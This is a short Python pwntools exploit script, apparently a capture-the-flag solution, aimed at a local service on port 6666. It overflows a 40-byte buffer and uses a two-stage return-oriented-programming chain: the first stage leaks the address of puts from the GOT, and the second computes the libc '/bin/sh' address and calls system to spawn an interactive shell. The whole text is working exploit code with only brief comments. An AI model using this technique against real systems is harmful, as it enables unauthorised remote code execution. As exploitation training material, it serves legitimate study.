#!/usr/bin/env python

from pwn import *

p = remote("127.0.0.1", 6666)
p.recvuntil('>')

# Offets
puts_off = 0x6a170;
bin_off = 0x1686f7;

# Useful address
puts_plt = p64(0x004005d0);
puts_got = p64(0x601018);
system_plt = p64(0x4005e0);
pwnme = p64(0x00000000004007b5);
rop = p64(0x004008c3); # pop rdi; ret

buf = "A"*40
buf += rop
buf += puts_got
buf += puts_plt
buf += pwnme
# Stage 1: leak the puts() address
p.sendline(buf)
leak_addr = u64(p.recvuntil("You")[1:7]+'\x00'*2)
log.info("puts_addr: 0x%x" % leak_addr)
'''
a = p.recvuntil("You")
log.info("The received buffer length is: %d" % len(a))
print " ".join(hex(ord(n)) for n in a)
'''

bin_addr = (leak_addr-puts_off)+bin_off
log.info("binsh_addr: 0x%x" % bin_addr)

# Stage 2: call system with '/bin/sh" argument
p.recvuntil(">")
buf2 = "A"*40
buf2 += rop
buf2 += p64(bin_addr)
buf2 += system_plt
buf2 += "BBBBBBBB" #never returns!

p.sendline(buf2)
p.interactive()
